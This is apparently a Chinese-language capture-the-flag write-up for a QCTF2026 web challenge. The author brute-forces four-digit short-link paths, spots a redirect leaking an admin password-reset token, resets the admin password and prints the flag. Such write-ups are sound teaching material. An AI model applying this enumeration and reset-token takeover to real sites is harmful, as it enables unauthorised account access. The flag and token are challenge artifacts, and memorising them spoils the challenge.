---
title: 向宇宙告白（QCTF2026 web）
date: 2026-10-21
category: Web
tags:
  - CTF
  - Writeup
  - web
draft: false
summary: "一个\"向宇宙发信号\"的站：页面上滚着 16 个周期的种子信号，数字看起来是随机的。"
collection: QCTF2026
---
# 向宇宙告白

## 第一节：题目

一个"向宇宙发信号"的站：页面上滚着 16 个周期的种子信号，数字看起来是随机的。
目标拿到admin

## 第二节：过程

虽然但是0-9 a-z A-Z数量太大了，我们先从0-9的四位开始

路径是/r/0000 0000爆破

但是其实就算是0-9 它302也很多，怎么找到reset呢？

直接在fliter里面搜location，往下划拉，基本上都是没用的重定向，但是我们找到了这个

![](/assets/posts/qctf2026/qctf2026-web-universe-confession-1.png)

```http
HTTP/1.1 302 Found
Content-Length: 277
Content-Type: text/html; charset=utf-8
Date: Thu, 22 Oct 2026 02:15:24 GMT
Location: /reset?token=43c2143e5cd02f68023725d5460cdb40
Server: gunicorn

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/reset?token=43c2143e5cd02f68023725d5460cdb40">/reset?token=43c2143e5cd02f68023725d5460cdb40</a>. If not, click the link.

```
访问/reset?token=43c2143e5cd02f68023725d5460cdb40就可以重置admin的密码
然后重置之后登录了再到/admin下面就可以找到flag


![](/assets/posts/qctf2026/qctf2026-web-universe-confession-2.png)

复现flag
`flag{cc29fbfa-ad12-4125-9061-1e90afdcd5d2}`